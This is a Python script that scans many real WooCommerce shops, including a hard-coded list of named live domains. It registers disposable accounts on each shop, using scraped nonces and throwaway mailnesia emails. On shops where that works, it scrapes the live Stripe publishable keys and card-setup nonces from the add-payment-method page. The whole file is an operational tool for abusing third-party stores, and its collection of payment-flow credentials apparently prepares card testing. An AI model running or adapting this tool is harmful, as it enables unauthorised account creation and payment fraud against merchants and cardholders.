# language: Python 3.12+, file: probe_registration.py, target: Windows 11
import asyncio
import random
import re
import string
import aiohttp

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"


def rand_str(k=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


async def test_domain(domain, sem):
    domain = domain.strip().lower()
    if not domain or any(x in domain for x in ["example", "mozilla", "wordpress", "dropbox", "canva", "google"]):
        return
    base = f"https://{domain}"
    url = f"{base}/my-account/"
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with sem:
        try:
            jar = aiohttp.CookieJar(unsafe=True)
            async with aiohttp.ClientSession(headers={"User-Agent": UA}, cookie_jar=jar, timeout=timeout) as s:
                async with s.get(url, ssl=False) as r:
                    if r.status != 200:
                        return
                    html = await r.text(errors="replace")
                
                m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
                if not m:
                    return
                nonce = m.group(1)
                
                uname = rand_str(10)
                email = f"{uname}@mailnesia.com"
                pwd = f"SecP@{rand_str(8)}!19"
                
                body = {
                    "username": uname,
                    "email": email,
                    "password": pwd,
                    "woocommerce-register-nonce": nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register"
                }
                
                async with s.post(url, data=body, ssl=False, headers={"Origin": base, "Referer": url}) as r:
                    resp_html = await r.text(errors="replace")
                    
                cookies = {c.key: c.value for c in s.cookie_jar}
                logged_in = any("wordpress_logged_in" in k for k in cookies)
                
                # Check for error notice
                err = ""
                m_err = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', resp_html, re.S)
                if m_err:
                    err = re.sub(r'<[^>]+>', ' ', m_err.group(1)).strip()[:60]
                    
                if logged_in:
                    print(f"\n[!!!] REGISTRATION SUCCESS: {base} (cookies={list(cookies.keys())})", flush=True)
                    # Check add-payment-method
                    async with s.get(f"{base}/my-account/add-payment-method/", ssl=False) as pm_r:
                        pm_html = await pm_r.text(errors="replace")
                        pk = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
                        upe = re.findall(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
                        leg = re.findall(r'add_card_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
                        print(f"      pk={pk[0][:20] if pk else 'none'} | upe_nonce={upe[0] if upe else 'none'} | leg_nonce={leg[0] if leg else 'none'}", flush=True)
                else:
                    print(f"[-] {domain:35} reg_failed: {err or 'no cookie'}", flush=True)
        except Exception as e:
            pass


async def main():
    domains = open("harvested_domains.txt", encoding="utf-8").read().splitlines()
    # Also add known WooCommerce stores
    domains.extend([
        "redefinesolutions.ca",
        "commercegurus.com",
        "businessbloomer.com",
        "somlaweb.com",
        "un-jardin-bio.com",
        "wisdomofplanets.com",
        "braveart.academy",
        "diegol.top",
        "essexmonastery.com",
        "thetrendywhippet.co.uk",
        "lifterlms.com",
        "rocketgeek.com",
        "saluteenterprises.com.au"
    ])
    domains = list(set(d.strip().lower() for d in domains if d.strip()))
    
    sem = asyncio.Semaphore(15)
    print(f"[*] Testing open registration across {len(domains)} candidate domains...", flush=True)
    await asyncio.gather(*(test_domain(d, sem) for d in domains))


if __name__ == "__main__":
    asyncio.run(main())
